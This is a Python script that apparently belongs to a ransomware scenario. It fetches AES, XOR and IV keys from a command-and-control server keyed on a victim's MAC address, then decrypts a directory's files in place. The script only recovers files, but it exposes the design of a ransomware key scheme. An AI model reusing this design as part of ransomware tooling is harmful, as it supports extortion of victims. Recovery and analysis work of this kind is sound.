#!/usr/bin/python3
import requests
import binascii
import base64
import urllib
import os
from colored import fg, attr
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

class Decryptor:
    def __init__(self, c2_ip, victim_mac):
        self.c2_ip = c2_ip
        self.victim_mac = victim_mac

    def decrypt(self, file):
        print("{}[+] Decrypting -> {}{}".format(fg(10), file, attr(0)))
        with open(file, "rb") as fd:
            ct = fd.read()

        cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
        xored_data = unpad(cipher.decrypt(ct), AES.block_size)

        plaintext = bytes([xored_data[i] ^ self.xor_key[i % len(self.xor_key)] for i in range(len(xored_data))])

        with open(file, "wb") as pt_data:
            pt_data.write(binascii.unhexlify(plaintext))

    def get_keys(self):
        print("{}[*] Retrieving encryption keys from C2 server...{}".format(fg(11), attr(0)))
        c2_url = f"http://{self.c2_ip}:5000/get_keys"
        victim_mac_address = urllib.parse.quote(base64.b64encode(self.victim_mac.encode()))
        response = requests.get(c2_url, params={"mac_address": victim_mac_address})

        if response.status_code == 200:
            self.enc_key, self.xor_key, self.iv = response.text.split("|")
            self.enc_key = self.decode_keys(self.enc_key)
            self.xor_key = self.decode_keys(self.xor_key)
            self.iv = self.decode_keys(self.iv)
        else:
            print("{}[-] Failed to retrieve keys{}".format(fg(9), attr(0)))
            exit(1)

    def dir_to_decrypt(self, dir_name):
        self.get_keys()
        print("{}[*] Decrypting '{}' directory{}".format(fg(11), dir_name, attr(0)))
        for root, _, files in os.walk(dir_name):
            for file in files:
                self.decrypt(os.path.join(root, file))

    def decode_keys(self, key):
        return base64.b64decode(key)

if __name__ == "__main__":
    c2_ip = input("Enter the C2 server IP address: ")
    victim_mac = input("Enter the victim's MAC address: ")
    target_directory = input("Enter the directory to decrypt: ")

    decryptor = Decryptor(c2_ip, victim_mac)
    decryptor.dir_to_decrypt(target_directory)
